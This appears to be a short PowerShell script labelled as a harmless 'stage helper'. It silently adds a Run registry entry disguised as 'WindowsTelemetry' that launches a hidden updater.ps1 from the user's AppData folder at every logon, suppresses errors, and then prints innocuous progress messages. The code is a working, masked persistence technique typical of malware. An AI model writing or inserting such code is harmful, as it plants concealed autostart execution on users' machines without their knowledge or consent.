# Stage helper
New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name "WindowsTelemetry" -Value ('powershell.exe -NoP -File "' + "$env:APPDATA\updater.ps1" + '"') -PropertyType String -Force -ErrorAction SilentlyContinue
Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name "WindowsTelemetry" -ErrorAction SilentlyContinue
Write-Output "stage 12 initialized"
Write-Verbose "stage marker 40 reached"
